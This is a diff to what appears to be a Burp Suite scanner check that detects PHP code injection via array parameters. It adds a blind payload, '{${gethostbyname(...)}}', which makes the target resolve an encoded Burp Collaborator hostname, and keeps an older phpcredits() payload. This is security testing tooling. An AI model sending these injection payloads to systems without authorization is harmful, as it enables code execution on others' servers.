@@ -290,7 +290,9 @@ class PhpPregArray(IScannerCheck):
     def __init__(self, callbacks):
         self._helpers = callbacks.getHelpers()
         self._done = getIssues('Code injection')
-        self._payloads = "{${phpcredits()}}" # TODO: blind injection!
+        self._ccc = callbacks.createBurpCollaboratorClientContext()
+        self._credits_payload = "{${phpcredits()}}"
+        self._collab_payload = "{${gethostbyname(%s)}}"
 
     def doActiveScan(self, basePair, insertionPoint):
         global check
@@ -309,12 +311,33 @@ class PhpPregArray(IScannerCheck):
                 p0 = parameter.getName() + "[0]"
                 p1 = parameter.getName() + "[1]"
 
-                newRequest0 = self._helpers.removeParameter(basePair.getRequest(), parameter)
+                reqWithoutParams = self._helpers.removeParameter(basePair.getRequest(), parameter)
+
+                # new method: Burp Collaborator
+
+                host = self._ccc.generatePayload(True)
+                host_php = '.'.join('chr(%d)' % ord(i) for i in host)
+                newParam0 = self._helpers.buildParameter(p0, "search", method)
+                newParam1 = self._helpers.buildParameter(p1, self._collab_payload % host_php, method)
+
+                newRequest0 = self._helpers.addParameter(reqWithoutParams, newParam0)
+                newRequest0 = self._helpers.addParameter(newRequest0, newParam1)
+
+                attack = callbacks.makeHttpRequest(basePair.getHttpService(), newRequest0)
+                events = self._ccc.fetchCollaboratorInteractionsFor(host)
+                if not events.isEmpty():
+                    url = self._helpers.analyzeRequest(attack).getUrl()
+                    print "PHP code injection vulnerability! (Collaborator)"
+                    if url not in self._done:
+                        self._done.append(url)
+                        return [CustomScanIssue(attack.getHttpService(), url, [attack], 'Code injection', "The application appears to evaluate user input as code, as it interacted with Collaborator by resolving <b>%s</b>.<p>" % host, 'Certain', 'High')]
+
+                # old method: phpcredits()
 
                 newParam0 = self._helpers.buildParameter(p0,"search",method)
-                newParam1 = self._helpers.buildParameter(p1,self._payloads,method)
+                newParam1 = self._helpers.buildParameter(p1,self._credits_payload,method)
 
-                newRequest0 = self._helpers.addParameter(newRequest0, newParam0)
+                newRequest0 = self._helpers.addParameter(reqWithoutParams, newParam0)
                 newRequest0 = self._helpers.addParameter(newRequest0, newParam1)
 
                 attack = callbacks.makeHttpRequest(basePair.getHttpService(), newRequest0)
